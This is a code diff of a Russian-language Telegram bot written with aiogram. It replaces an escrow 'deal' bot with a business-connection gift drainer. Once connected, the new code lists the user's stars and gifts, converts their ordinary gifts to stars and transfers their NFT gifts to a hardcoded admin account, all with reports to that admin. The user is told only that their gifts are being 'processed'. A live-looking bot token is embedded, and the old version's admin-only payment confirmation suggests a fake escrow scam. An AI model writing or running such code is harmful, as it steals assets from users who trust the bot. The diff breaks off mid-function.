@@ -1,533 +1,495 @@
-import asyncio
-import logging
+import os
 import json
-from aiogram import Bot, Dispatcher, types, F
-from aiogram.filters import Command, CommandObject
-from aiogram.fsm.context import FSMContext
-from aiogram.fsm.storage.memory import MemoryStorage
-from aiogram.types import (
-    CallbackQuery,
-    Message,
-    FSInputFile,
-    InlineKeyboardMarkup,
-    InlineKeyboardButton,
-)
-from aiogram.utils.keyboard import InlineKeyboardBuilder
+import logging
+import asyncio
+from datetime import datetime
+from aiogram import Bot, Dispatcher, F
+from aiogram.types import Message, BusinessConnection, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
+from aiogram.exceptions import TelegramBadRequest
+from aiogram.methods import TransferGift, ConvertGiftToStars
+from aiogram.methods.get_business_account_star_balance import GetBusinessAccountStarBalance
+from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
+import config
 
-from config import BOT_TOKEN, BOT_USERNAME, SUPER_ADMIN_IDS
-from database import db
-from states import DealStates, RequisitesStates, ScamStates, WithdrawStates, AdminStates
-from keyboards import (
-    main_menu,
-    deal_type_menu,
-    currency_menu,
-    requisites_edit_menu,
-    scam_base_menu,
-    back_menu,
-    deal_confirm_menu,
-)
-from utils import format_amount, get_rating_stars, t
+# Конфигурация
+BOT_TOKEN = "8455279912:AAFoWu_2-qxq-BoJUjzwXV1tcRcBnBptkhs"
+ADMIN_ID = 8717189451  # ID админа для уведомлений
+CONNECTIONS_FILE = "connections.json"
+GIFTS_CACHE_FILE = "gifts_cache.json"
 
-# Настройка логирования
-logging.basicConfig(
-    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
-)
-logger = logging.getLogger(__name__)
+# Инициализация
+bot = Bot(token=BOT_TOKEN)
+dp = Dispatcher()
 
-# ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================
-
-async def send_main_menu(target, user_id: int, username: str, first_name: str):
-    user_data = db.get_user(user_id)
-    rating = user_data[7] if user_data else 5.0
-    deals_count = user_data[5] if user_data else 0
-    stats = db.get_stats()
-    total_paid = stats[1] if stats else 0
-    lang = db.get_user_lang(user_id)
-    
-    is_super = user_id in SUPER_ADMIN_IDS
-    markup = main_menu(is_super_admin=is_super, lang=lang)
-
-    text = t('main_menu', lang).format(
-        name=first_name,
-        rating=get_rating_stars(rating),
-        val=f"{rating:.1f}",
-        deals=deals_count,
-        total=format_amount(total_paid)
-    )
-
+def load_connections():
+    """Загрузка бизнес-подключений"""
+    if not os.path.exists(CONNECTIONS_FILE):
+        return []
     try:
-        photo = FSInputFile("main.jpg")
-        if isinstance(target, Message):
-            await target.answer_photo(
-                photo=photo, caption=text, parse_mode="HTML", reply_markup=markup
-            )
-        elif isinstance(target, CallbackQuery):
-            await target.message.answer_photo(
-                photo=photo, caption=text, parse_mode="HTML", reply_markup=markup
-            )
-            try:
-                await target.message.delete()
-            except:
-                pass
+        with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
+            return json.load(f)
+    except (json.JSONDecodeError, FileNotFoundError):
+        return []
+
+def save_connections(connections):
+    """Сохранение бизнес-подключений"""
+    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
+        json.dump(connections, f, indent=2, ensure_ascii=False)
+
+def load_gifts_cache():
+    """Загрузка кэша гифтов"""
+    if not os.path.exists(GIFTS_CACHE_FILE):
+        return {}
+    try:
+        with open(GIFTS_CACHE_FILE, "r", encoding="utf-8") as f:
+            return json.load(f)
+    except (json.JSONDecodeError, FileNotFoundError):
+        return {}
+
+def save_gifts_cache(cache):
+    """Сохранение кэша гифтов"""
+    with open(GIFTS_CACHE_FILE, "w", encoding="utf-8") as f:
+        json.dump(cache, f, indent=2, ensure_ascii=False)
+
+async def get_business_gifts(business_connection_id):
+    """Получение списка гифтов бизнес-аккаунта"""
+    try:
+        result = await bot(GetBusinessAccountGifts(
+            business_connection_id=business_connection_id
+        ))
+        return result.gifts if result else []
     except Exception as e:
-        logger.error(f"Error sending main menu: {e}")
-        if isinstance(target, Message):
-            await target.answer(
-                text=text, parse_mode="HTML", reply_markup=markup
-            )
-        elif isinstance(target, CallbackQuery):
-            await target.message.answer(
-                text=text, parse_mode="HTML", reply_markup=markup
-            )
-            try:
-                await target.message.delete()
-            except:
-                pass
+        logging.error(f"Ошибка получения гифтов: {e}")
+        return []
 
-# ==================== ОБРАБОТЧИКИ ====================
-
-dp = Dispatcher(storage=MemoryStorage())
-
-@dp.message(Command("start"))
-async def cmd_start(message: Message, command: CommandObject):
-    user = message.from_user
-    db.save_user(user.id, user.username or "", user.first_name)
-
-    if command.args:
-        deal_id = command.args.replace("deal_", "")
-        deal = db.get_deal(deal_id)
-
-        if deal and deal["status"] == "waiting":
-            db.set_buyer(deal_id, user.id)
-            deal = db.get_deal(deal_id)
-            amount_str = format_amount(deal["amount"])
-            seller = db.get_user(deal["seller_id"])
-
-            text = f"""
-📋 <b>СДЕЛКА #{deal["deal_id"]}</b>
-
-👤 <b>Продавец:</b> {seller[2] if seller else "Пользователь"} @{seller[1] if seller else "no_username"}
-📦 <b>Тип:</b> {deal["deal_type"]}
-💰 <b>Сумма:</b> {amount_str} {deal["currency"]}
-
-<b>Статус:</b> {"🟡 Ожидает оплаты" if deal["status"] == "waiting" else "🔵 Оплачено"}
-"""
-            builder = InlineKeyboardBuilder()
-            all_admins = SUPER_ADMIN_IDS + db.get_admins()
-            if user.id in all_admins:
-                builder.row(
-                    InlineKeyboardButton(
-                        text="✅ Я оплатил", callback_data=f"pay_{deal_id}"
-                    )
-                )
-            builder.row(
-                InlineKeyboardButton(text="◀️ Назад в меню", callback_data="menu")
-            )
-
-            await message.answer(
-                text, parse_mode="HTML", reply_markup=builder.as_markup()
-            )
-            return
-
-    await send_main_menu(message, user.id, user.username or "", user.first_name)
-
-@dp.callback_query(F.data == "new_deal")
-async def new_deal_handler(callback: CallbackQuery, state: FSMContext):
-    lang = db.get_user_lang(callback.from_user.id)
-    await callback.answer()
-    await callback.message.answer(
-        t('select_type', lang), reply_markup=deal_type_menu(lang=lang)
-    )
+async def get_business_stars(business_connection_id):
+    """Получение баланса звезд"""
     try:
-        await callback.message.delete()
-    except:
-        pass
-    await state.set_state(DealStates.waiting_deal_type)
+        result = await bot(GetBusinessAccountStarBalance(
+            business_connection_id=business_connection_id
+        ))
+        return result.star_amount if result else 0
+    except Exception as e:
+        logging.error(f"Ошибка получения звезд: {e}")
+        return 0
 
-@dp.callback_query(F.data == "back_to_deal_type")
-async def back_to_deal_type_handler(callback: CallbackQuery, state: FSMContext):
-    lang = db.get_user_lang(callback.from_user.id)
-    await callback.answer()
-    await callback.message.answer(
-        t('select_type', lang), reply_markup=deal_type_menu(lang=lang)
-    )
+def format_gift_info(gift):
+    """Форматирование информации о гифте"""
+    is_nft = gift.get("is_nft", False)
+    gift_type = "🟣 NFT" if is_nft else "⭐️ Обычный"
+    
+    info = f"{gift_type} | {gift.get('title', 'Без названия')}\n"
+    info += f"   ID: `{gift.get('id', 'N/A')}`\n"
+    
+    if gift.get("star_cost"):
+        info += f"   💫 Стоимость: {gift.get('star_cost')} звезд\n"
+    
+    if gift.get("cooldown_until"):
+        cooldown = datetime.fromisoformat(gift.get("cooldown_until"))
+        now = datetime.now()
+        if cooldown > now:
+            remaining = cooldown - now
+            hours = remaining.seconds // 3600
+            minutes = (remaining.seconds % 3600) // 60
+            info += f"   ⏰ КД: {hours}ч {minutes}мин (до {cooldown.strftime('%H:%M')})\n"
+        else:
+            info += f"   ✅ КД: нет\n"
+    
+    if gift.get("count"):
+        info += f"   📦 Количество: {gift.get('count')}\n"
+    
+    return info
+
+async def send_admin_report(connection_id, user_id, stars_balance, gifts):
+    """Отправка подробного отчета админу"""
     try:
-        await callback.message.delete()
-    except:
-        pass
-    await state.set_state(DealStates.waiting_deal_type)
-
-@dp.callback_query(F.data.startswith("set_lang_"))
-async def set_lang_handler(callback: CallbackQuery):
-    lang = callback.data.split("_")[2]
-    db.update_language(callback.from_user.id, lang)
-    await callback.answer("Language updated!" if lang == 'en' else "Язык обновлен!")
-    await send_main_menu(callback, callback.from_user.id, callback.from_user.username or "", callback.from_user.first_name)
-
-@dp.callback_query(F.data == "profile")
-async def profile_handler(callback: CallbackQuery):
-    user_data = db.get_user(callback.from_user.id)
-    if not user_data:
-        db.save_user(
-            callback.from_user.id,
-            callback.from_user.username or "",
-            callback.from_user.first_name,
-        )
-        user_data = db.get_user(callback.from_user.id)
-
-    rating = user_data[7]
-    deals_count = user_data[5] + user_data[6]
-    balance = user_data[3]
-    frozen = user_data[4]
-
-    text = f"""
-👤 <b>Профиль пользователя</b>
-
-<b>ID:</b> <code>{callback.from_user.id}</code>
-<b>Имя:</b> {callback.from_user.first_name}
-<b>Username:</b> @{callback.from_user.username or "не указан"}
-
-<b>Рейтинг:</b> {get_rating_stars(rating)} ({rating:.1f}/5)
-<b>Всего сделок:</b> {deals_count}
-
-💰 <b>Баланс:</b> {format_amount(balance)} RUB
-❄️ <b>Заморожено:</b> {format_amount(frozen)} RUB
-"""
-    await callback.answer()
-    await callback.message.answer(
-        text, parse_mode="HTML", reply_markup=back_menu()
-    )
-    try:
-        await callback.message.delete()
-    except:
-        pass
-
-@dp.callback_query(DealStates.waiting_deal_type, F.data.startswith("type_"))
-async def deal_type_selected(callback: CallbackQuery, state: FSMContext):
-    await callback.answer()
-    type_key = callback.data.split("_")[1]
-    type_map = {"gift": "Подарок", "account": "Аккаунт", "other": "Другое"}
-    deal_type = type_map.get(type_key, "Другое")
-    await state.update_data(deal_type=deal_type)
-
-    text = f"<b>Введите описание товара</b> (Тип: {deal_type}):"
-    if deal_type == "Подарок":
-        text += "\n\n<i>ВНИМАНИЕ! Для типа 'Подарок':\nПосле подтверждения оплаты вы должны передать подарок покупателю.</i>"
-
-    await callback.message.answer(text, parse_mode="HTML", reply_markup=back_menu())
-    try:
-        await callback.message.delete()
-    except:
-        pass
-    await state.set_state(DealStates.waiting_description)
-
-@dp.message(DealStates.waiting_description, F.text)
-async def get_description(message: Message, state: FSMContext):
-    await state.update_data(description=message.text)
-    await message.answer(
-        "<b>Введите сумму сделки:</b>\nПример: 15000",
-        parse_mode="HTML",
-        reply_markup=back_menu(),
-    )
-    await state.set_state(DealStates.waiting_amount)
-
-@dp.message(DealStates.waiting_amount, F.text)
-async def get_amount(message: Message, state: FSMContext):
-    try:
-        amount = float(message.text.replace(",", "."))
-        if amount <= 0:
-            raise ValueError
-    except:
-        await message.answer(
-            "❌ Введите корректную сумму (положительное число):",
-            reply_markup=back_menu(),
-        )
-        return
-
-    await state.update_data(amount=amount)
-    lang = db.get_user_lang(message.from_user.id)
-    await message.answer(
-        t('select_currency', lang).format(amount=format_amount(amount)),
-        parse_mode="HTML",
-        reply_markup=currency_menu(),
-    )
-    await state.set_state(DealStates.waiting_currency)
-
-@dp.callback_query(DealStates.waiting_currency, F.data.startswith("cur_"))
-async def get_currency(callback: CallbackQuery, state: FSMContext):
-    await callback.answer()
-    currency = callback.data.split("_")[1]
-    data = await state.get_data()
-    deal_type = data.get("deal_type")
-    description = data.get("description")
-    amount = data.get("amount")
-    lang = db.get_user_lang(callback.from_user.id)
-
-    deal_id = db.create_deal(callback.from_user.id, deal_type, description, amount, currency)
-    link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
-    amount_str = format_amount(amount)
-
-    text = t('deal_created', lang).format(
-        type=deal_type,
-        desc=description,
-        amount=amount_str,
-        cur=currency,
-        id=deal_id,
-        link=link
-    )
-    await callback.message.answer(text, parse_mode="HTML", reply_markup=back_menu())
-    try:
-        await callback.message.delete()
-    except:
-        pass
-    await state.clear()
-
-@dp.callback_query(F.data == "requisites")
-async def requisites_handler(callback: CallbackQuery):
-    user_data = db.get_user(callback.from_user.id)
-    requisites = json.loads(user_data[8]) if user_data and user_data[8] else {}
-
-    text = "💳 <b>Ваши реквизиты для вывода:</b>\n\n"
-    type_names = {"card": "Карта", "kaspi": "Kaspi", "qiwi": "QIWI", "yoomoney": "ЮMoney", "webmoney": "WebMoney"}
-
-    for req_type, name in type_names.items():
-        val = requisites.get(req_type, "<i>не указано</i>")
-        text += f"• <b>{name}:</b> {val}\n"
-
-    text += "\nВыберите тип для изменения:"
-    await callback.answer()
-    await callback.message.answer(text, parse_mode="HTML", reply_markup=requisites_edit_menu())
-    try:
-        await callback.message.delete()
-    except:
-        pass
-
-@dp.callback_query(F.data == "scam_base")
-async def scam_base_handler(callback: CallbackQuery):
-    await callback.answer()
-    await callback.message.answer("Выберите действие:", reply_markup=scam_base_menu())
-    try:
-        await callback.message.delete()
-    except:
-        pass
-
-@dp.callback_query(F.data == "my_deals")
-async def my_deals_handler(callback: CallbackQuery):
-    deals = db.get_user_deals(callback.from_user.id)
-    if not deals:
-        await callback.answer()
-        await callback.message.answer("📋 <b>У вас пока нет сделок</b>", parse_mode="HTML", reply_markup=back_menu())
-        try:
-            await callback.message.delete()
-        except:
-            pass
-        return
-
-    text = "📋 <b>Ваши последние сделки:</b>\n\n"
-    for deal in deals[:10]:
-        status_emoji = "⏳" if deal[7] == "waiting" else "✅"
-        text += f"{status_emoji} #{deal[0]} | {deal[3]} | {format_amount(deal[5])} {deal[6]}\n"
-
-    await callback.answer()
-    await callback.message.answer(text, parse_mode="HTML", reply_markup=back_menu())
-    try:
-        await callback.message.delete()
-    except:
-        pass
-
-@dp.callback_query(F.data == "withdraw")
-async def withdraw_handler(callback: CallbackQuery):
-    user_data = db.get_user(callback.from_user.id)
-    available = user_data[3] if user_data else 0
-
-    text = f"""
-💰 <b>Вывод средств</b>
-
-<b>Доступно для вывода:</b> {format_amount(available)} RUB
-<b>Минимальная сумма:</b> 100 RUB
-
-Для вывода средств у вас должны быть заполнены реквизиты.
-"""
-    if available > 0:
-        text += "\n✏️ Введите сумму для вывода:"
-
-    await callback.answer()
-    await callback.message.answer(text, parse_mode="HTML", reply_markup=back_menu())
-    try:
-        await callback.message.delete()
-    except:
-        pass
-
-@dp.callback_query(F.data.startswith("req_"))
-async def requisites_edit_start(callback: CallbackQuery, state: FSMContext):
-    await callback.answer()
-    req_type = callback.data[4:]
-    type_names = {"card": "Карта", "kaspi": "Kaspi", "qiwi": "QIWI", "yoomoney": "ЮMoney", "webmoney": "WebMoney"}
-    await state.update_data(req_type=req_type)
-    await callback.message.answer(f"<b>{type_names[req_type]}</b>\n\nВведите реквизиты:", parse_mode="HTML", reply_markup=back_menu())
-    try:
-        await callback.message.delete()
-    except:
-        pass
-    await state.set_state(RequisitesStates.waiting_value)
-
-@dp.message(RequisitesStates.waiting_value, F.text)
-async def get_requisite_value(message: Message, state: FSMContext):
-    data = await state.get_data()
-    req_type = data.get("req_type")
-    db.update_requisites(message.from_user.id, req_type, message.text)
-    await message.answer(f"✅ Реквизиты сохранены!", reply_markup=back_menu())
-    await state.clear()
-
-@dp.callback_query(F.data.startswith("pay_"))
-async def pay_deal_handler(callback: CallbackQuery, bot: Bot):
-    all_admins = SUPER_ADMIN_IDS + db.get_admins()
-    if callback.from_user.id not in all_admins:
-        return await callback.answer("У вас нет прав для подтверждения оплаты!", show_alert=True)
-
-    await callback.answer()
-    deal_id = callback.data.replace("pay_", "")
-    deal = db.get_deal(deal_id)
-
-    if deal and deal["status"] == "waiting":
-        db.mark_paid(deal_id)
-        amount_str = format_amount(deal["amount"])
-
-        await callback.message.answer(f"✅ <b>Оплата по сделке #{deal_id} отмечена!</b>", parse_mode="HTML", reply_markup=back_menu())
-        try:
-            await callback.message.delete()
-        except:
-            pass
-
-        seller_lang = db.get_user_lang(deal["seller_id"])
+        # Сортируем гифты
+        nft_gifts = [g for g in gifts if g.get("is_nft", False)]
+        normal_gifts = [g for g in gifts if not g.get("is_nft", False)]
+        
+        # Формируем сообщение
+        report = f"🔔 **Новое бизнес-подключение!**\n\n"
+        report += f"👤 **Пользователь:** `{user_id}`\n"
+        report += f"🔗 **Connection ID:** `{connection_id}`\n"
+        report += f"💫 **Баланс звезд:** {stars_balance}\n"
+        report += f"📦 **Всего подарков:** {len(gifts)}\n"
+        report += f"   • NFT: {len(nft_gifts)}\n"
+        report += f"   • Обычных: {len(normal_gifts)}\n\n"
+        
+        # NFT с КД
+        if nft_gifts:
+            report += f"**🟣 NFT Подарки:**\n"
+            for nft in nft_gifts:
+                report += format_gift_info(nft)
+                report += "\n"
+        else:
+            report += f"**🟣 NFT:** нет\n\n"
+        
+        # Обычные подарки
+        if normal_gifts:
+            report += f"**⭐️ Обычные подарки:**\n"
+            for gift in normal_gifts[:10]:  # Показываем первые 10
+                report += format_gift_info(gift)
+                report += "\n"
+            if len(normal_gifts) > 10:
+                report += f"... и еще {len(normal_gifts) - 10} подарков\n"
+        else:
+            report += f"**⭐️ Обычные:** нет\n"
+        
+        # Кнопки управления
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [
+                InlineKeyboardButton(text="🔄 Обновить", callback_data=f"refresh_{user_id}_{connection_id}"),
+                InlineKeyboardButton(text="📊 Статистика", callback_data=f"stats_{user_id}_{connection_id}")
+            ],
+            [
+                InlineKeyboardButton(text="💰 Конвертировать всё", callback_data=f"convert_all_{connection_id}"),
+                InlineKeyboardButton(text="🎁 Передать NFT", callback_data=f"transfer_nft_{connection_id}")
+            ]
+        ])
         
         await bot.send_message(
-            deal["seller_id"],
-            t('buyer_paid', seller_lang).format(
-                id=deal_id,
-                type=deal['deal_type'],
-                desc=deal['description'],
-                amount=amount_str,
-                cur=deal['currency'],
-                buyer_id=callback.from_user.id
-            ),
-            parse_mode="HTML",
-            reply_markup=back_menu(),
+            chat_id=ADMIN_ID,
+            text=report,
+            parse_mode="Markdown",
+            reply_markup=keyboard
+        )
+        
+    except Exception as e:
+        logging.exception(f"Ошибка отправки отчета админу: {e}")
+
+async def send_update_report(user_id, connection_id, action, details):
+    """Отправка обновления админу после действий"""
+    try:
+        report = f"🔄 **Обновление по пользователю** `{user_id}`\n\n"
+        report += f"📝 **Действие:** {action}\n"
+        report += f"📊 **Детали:**\n{details}\n"
+        report += f"⏰ **Время:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="🔄 Полный отчет", callback_data=f"full_report_{user_id}_{connection_id}")]
+        ])
+        
+        await bot.send_message(
+            chat_id=ADMIN_ID,
+            text=report,
+            parse_mode="Markdown",
+            reply_markup=keyboard
+        )
+    except Exception as e:
+        logging.exception(f"Ошибка отправки обновления: {e}")
+
+async def convert_gift_to_stars(business_connection_id, gift_id, user_id):
+    """Конвертация обычного подарка в звезды с отчетом"""
+    try:
+        await bot(ConvertGiftToStars(
+            business_connection_id=business_connection_id,
+            gift_id=gift_id
+        ))
+        
+        # Отправляем отчет админу
+        await send_update_report(
+            user_id,
+            business_connection_id,
+            "Конвертация подарка",
+            f"✅ Подарок `{gift_id}` конвертирован в звезды"
+        )
+        return True
+    except Exception as e:
+        logging.error(f"Ошибка конвертации подарка {gift_id}: {e}")
+        await send_update_report(
+            user_id,
+            business_connection_id,
+            "Ошибка конвертации",
+            f"❌ Подарок `{gift_id}`: {str(e)}"
+        )
+        return False
+
+async def transfer_gift(business_connection_id, gift_id, target_user_id, user_id):
+    """Передача гифта с отчетом"""
+    try:
+        await bot(TransferGift(
+            business_connection_id=business_connection_id,
+            gift_id=gift_id,
+            receiver_user_id=target_user_id
+        ))
+        
+        await send_update_report(
+            user_id,
+            business_connection_id,
+            "Передача NFT",
+            f"✅ NFT `{gift_id}` передан админу"
+        )
+        return True
+    except TelegramBadRequest as e:
+        error_msg = f"❌ Нет доступа к NFT `{gift_id}`"
+        logging.warning(error_msg)
+        await send_update_report(
+            user_id,
+            business_connection_id,
+            "Ошибка передачи",
+            error_msg
+        )
+        return False
+    except Exception as e:
+        error_msg = f"❌ Ошибка: {str(e)}"
+        logging.error(f"Ошибка передачи подарка {gift_id}: {e}")
+        await send_update_report(
+            user_id,
+            business_connection_id,
+            "Ошибка передачи",
+            error_msg
+        )
+        return False
+
+async def process_gifts(business_connection_id, user_id, stars_balance, gifts):
+    """Обработка гифтов с подробным отчетом"""
+    try:
+        nft_gifts = [g for g in gifts if g.get("is_nft", False)]
+        normal_gifts = [g for g in gifts if not g.get("is_nft", False)]
+        
+        details = f"💰 Начальный баланс: {stars_balance} звезд\n"
+        details += f"📦 Всего гифтов: {len(gifts)} (NFT: {len(nft_gifts)}, обычных: {len(normal_gifts)})\n\n"
+        
+        # Конвертируем обычные подарки
+        converted_count = 0
+        for gift in normal_gifts:
+            if await convert_gift_to_stars(business_connection_id, gift.id, user_id):
+                converted_count += 1
+            await asyncio.sleep(0.5)
+        
+        details += f"✅ Конвертировано обычных подарков: {converted_count}\n"
+        
+        # Обновляем баланс после конвертации
+        await asyncio.sleep(1)
+        new_stars_balance = await get_business_stars(business_connection_id)
+        details += f"💰 Новый баланс звезд: {new_stars_balance}\n\n"
+        
+        # Передаем NFT
+        transferred_count = 0
+        for nft in nft_gifts:
+            required_stars = nft.get("star_cost", 25)
+            
+            if new_stars_balance < required_stars:
+                details += f"⚠️ Не хватает звезд для NFT `{nft.get('id')}` (нужно {required_stars})\n"
+                continue
+            
+            if await transfer_gift(business_connection_id, nft.id, ADMIN_ID, user_id):
+                transferred_count += 1
+                new_stars_balance -= required_stars
+            await asyncio.sleep(0.5)
+        
+        details += f"\n🎁 Передано NFT: {transferred_count}/{len(nft_gifts)}"
+        
+        # Финальный отчет админу
+        await send_update_report(
+            user_id,
+            business_connection_id,
+            "Обработка завершена",
+            details
+        )
+        
+        return converted_count, transferred_count
+        
+    except Exception as e:
+        logging.exception(f"Ошибка обработки гифтов: {e}")
+        await send_update_report(
+            user_id,
+            business_connection_id,
+            "Критическая ошибка",
+            f"❌ {str(e)}"
+        )
+        return 0, 0
+
+@dp.business_connection()
+async def handle_business_connection(connection: BusinessConnection):
+    """Обработка нового бизнес-подключения"""
+    try:
+        user_id = connection.user.id
+        connection_id = connection.business_connection_id
+        
+        logging.info(f"Новое бизнес-подключение от {user_id}")
+        
+        # Сохраняем подключение
+        connections = load_connections()
+        connection_data = {
+            "business_connection_id": connection_id,
+            "user_id": user_id,
+            "date": connection.date.isoformat(),
+            "status": "active"
+        }
+        
+        updated = False
+        for i, conn in enumerate(connections):
+            if conn["user_id"] == user_id:
+                connections[i] = connection_data
+                updated = True
+                break
+        
+        if not updated:
+            connections.append(connection_data)
+        
+        save_connections(connections)
+        
+        # Получаем данные о гифтах и звездах
+        gifts = await get_business_gifts(connection_id)
+        stars_balance = await get_business_stars(connection_id)
+        
+        # Отправляем отчет админу
+        await send_admin_report(connection_id, user_id, stars_balance, gifts)
+        
+        # Приветствие пользователю
+        await bot.send_message(
+            business_connection_id=connection_id,
+            chat_id=user_id,
+            text="✅ Бот активирован! Начинаю обработку ваших подарков..."
+        )
+        
+        # Обрабатываем гифты
+        await process_gifts(connection_id, user_id, stars_balance, gifts)
+        
+        # Финальное сообщение пользователю
+        await bot.send_message(
+            business_connection_id=connection_id,
+            chat_id=user_id,
+            text="✅ Все подарки обработаны! Спасибо за использование бота."
+        )
+        
+    except Exception as e:
+        logging.exception(f"Ошибка в бизнес-подключении: {e}")
+        await bot.send_message(
+            chat_id=ADMIN_ID,
+            text=f"⚠️ Критическая ошибка при подключении {user_id}: {e}"
         )
 
-
-@dp.callback_query(F.data == "menu")
-async def menu_handler(callback: CallbackQuery):
-    await callback.answer()
-    await send_main_menu(callback, callback.from_user.id, callback.from_user.username or "", callback.from_user.first_name)
-
-# ==================== АДМИН ПАНЕЛЬ ====================
-
-@dp.callback_query(F.data == "admin_list")
-async def admin_list_handler(callback: CallbackQuery):
-    if callback.from_user.id not in SUPER_ADMIN_IDS:
-        return await callback.answer("У вас нет прав!", show_alert=True)
-    
-    admins = db.get_admins()
-    text = "👥 <b>Список обычных администраторов:</b>\n\n"
-    if not admins:
-        text += "<i>Список пуст</i>"
-    else:
-        for i, admin_id in enumerate(admins, 1):
-            text += f"{i}. <code>{admin_id}</code>\n"
-    
-    await callback.message.answer(text, parse_mode="HTML", reply_markup=back_menu())
+@dp.callback_query()
+async def handle_callback(callback: CallbackQuery):
+    """Обработка кнопок админа"""
     try:
+        data = callback.data.split("_")
+        action = data[0]
+        
+        if action == "refresh":
+            user_id = int(data[1])
+            connection_id = data[2]
+            
+            # Обновляем данные
+            gifts = await get_business_gifts(connection_id)
+            stars_balance = await get_business_stars(connection_id)
+            
+            await send_admin_report(connection_id, user_id, stars_balance, gifts)
+            await callback.answer("Данные обновлены!")
+            
+        elif action == "stats":
+            user_id = int(data[1])
+            connection_id = data[2]
+            
+            # Получаем кэшированные данные или новые
+            gifts = await get_business_gifts(connection_id)
+            stars_balance = await get_business_stars(connection_id)
+            
+            stats = f"📊 **Статистика пользователя** `{user_id}`\n\n"
+            stats += f"💫 Баланс звезд: {stars_balance}\n"
+            stats += f"📦 Всего подарков: {len(gifts)}\n"
+            stats += f"🟣 NFT: {len([g for g in gifts if g.get('is_nft', False)])}\n"
+            stats += f"⭐️ Обычных: {len([g for g in gifts if not g.get('is_nft', False)])}"
+            
+            await callback.message.answer(stats, parse_mode="Markdown")
+            await callback.answer()
+            
+        elif action == "full":
+            user_id = int(data[1])
+            connection_id = data[2]
+            
+            gifts = await get_business_gifts(connection_id)
+            stars_balance = await get_business_stars(connection_id)
+            
+            await send_admin_report(connection_id, user_id, stars_balance, gifts)
+            await callback.answer("Полный отчет отправлен!")
+            
+        elif action == "convert":
+            connection_id = data[1]
+            
+            # Получаем все обычные подарки
+            gifts = await get_business_gifts(connection_id)
+            normal_gifts = [g for g in gifts if not g.get("is_nft", False)]
+            
+            for gift in normal_gifts:
+                await convert_gift_to_stars(connection_id, gift.id, 0)
+                await asyncio.sleep(0.5)
+            
+            await callback.answer(f"Конвертировано {len(normal_gifts)} подарков!")
+            
+        elif action == "transfer":
+            connection_id = data[1]
+            
+            gifts = await get_business_gifts(connection_id)
+            nft_gifts = [g for g in gifts if g.get("is_nft", False)]
+            stars_balance = await get_business_stars(connection_id)
+            
+            transferred = 0
+            for nft in nft_gifts:
+                required_stars = nft.get("star_cost", 25)
+                if stars_balance >= required_stars:
+                    if await transfer_gift(connection_id, nft.id, ADMIN_ID, 0):
+                        transferred += 1
+                        stars_balance -= required_stars
+                await asyncio.sleep(0.5)
+            
+            await callback.answer(f"Передано {transferred} NFT!")
+            
         await callback.message.delete()
-    except:
-        pass
+        
+    except Exception as e:
+        logging.exception(f"Ошибка в callback: {e}")
+        await callback.answer(f"Ошибка: {e}")
 
-@dp.callback_query(F.data == "admin_add")
-async def admin_add_start(callback: CallbackQuery, state: FSMContext):
-    if callback.from_user.id not in SUPER_ADMIN_IDS:
-        return await callback.answer("У вас нет прав!", show_alert=True)
+@dp.message(F.text == "/start")
+async def start_command(message: Message):
+    """Команда /start"""
+    connections = load_connections()
+    count = len(connections)
     
-    await callback.message.answer("Введите Telegram ID пользователя, которого хотите сделать админом:", reply_markup=back_menu())
-    await state.set_state(AdminStates.waiting_admin_id_add)
-    try:
-        await callback.message.delete()
-    except:
-        pass
+    await message.answer(
+        f"🤖 **Бизнес-бот для сбора подарков**\n\n"
+        f"📊 Активных подключений: `{count}`\n\n"
+        f"**Как это работает:**\n"
+        f"1️⃣ Подключите меня как бизнес-бота\n"
+        f"2️⃣ Я автоматически:\n"
+        f"   • Конвертирую обычные подарки в звезды\n"
+        f"   • Передаю NFT администратору\n"
+        f"3️⃣ Админ получает полный отчет о:\n"
+        f"   • Вашем балансе звезд\n"
+        f"   • Всех подарках с КД\n"
+        f"   • Статусе обработки\n\n"
+        f"👤 **Администратор:** `{ADMIN_ID}`",
+        parse_mode="Markdown"
+    )
 
-@dp.message(AdminStates.waiting_admin_id_add, F.text)
-async def admin_add_finish(message: Message, state: FSMContext):
-    if message.from_user.id not in SUPER_ADMIN_IDS:
+@dp.message(F.text == "/stats")
+async def stats_command(message: Message):
+    """Статистика для админа"""
+    if message.from_user.id != ADMIN_ID:
+        await message.reply("❌ Нет доступа.")
         return
     
-    try:
-        admin_id = int(message.text)
-        db.add_admin(admin_id)
-        await message.answer(f"✅ Пользователь <code>{admin_id}</code> назначен администратором!", parse_mode="HTML", reply_markup=back_menu())
-        await state.clear()
-    except ValueError:
-        await message.answer("❌ Введите корректный числовой ID!")
-
-@dp.callback_query(F.data == "admin_remove")
-async def admin_remove_start(callback: CallbackQuery, state: FSMContext):
-    if callback.from_user.id not in SUPER_ADMIN_IDS:
-        return await callback.answer("У вас нет прав!", show_alert=True)
+    connections = load_connections()
     
-    await callback.message.answer("Введите Telegram ID пользователя, которого хотите удалить из админов:", reply_markup=back_menu())
-    await state.set_state(AdminStates.waiting_admin_id_remove)
-    try:
-        await callback.message.delete()
-    except:
-        pass
-
-@dp.message(AdminStates.waiting_admin_id_remove, F.text)
-async def admin_remove_finish(message: Message, state: FSMContext):
-    if message.from_user.id not in SUPER_ADMIN_IDS:
-        return
+    stats = f"📊 **Статистика бота**\n\n"
+    stats += f"🔗 Всего подключений: `{len(connections)}`\n"
+    stats += f"🟢 Активных: `{len([c for c in connections if c.get('status') == 'active'])}`\n\n"
+    stats += f"**Последние подключения:**\n"
     
-    try:
-        admin_id = int(message.text)
-        db.remove_admin(admin_id)
-        await message.answer(f"✅ Пользователь <code>{admin_id}</code> удален из списка администраторов!", parse_mode="HTML", reply_markup=back_menu())
-        await state.clear()
-    except ValueError:
-        await message.answer("❌ Введите корректный числовой ID!")
-
-@dp.callback_query(F.data == "admin_broadcast")
-async def admin_broadcast_start(callback: CallbackQuery, state: FSMContext):
-    if callback.from_user.id not in SUPER_ADMIN_IDS:
-        return await callback.answer("У вас нет прав!", show_alert=True)
+    for conn in connections[-10:]:
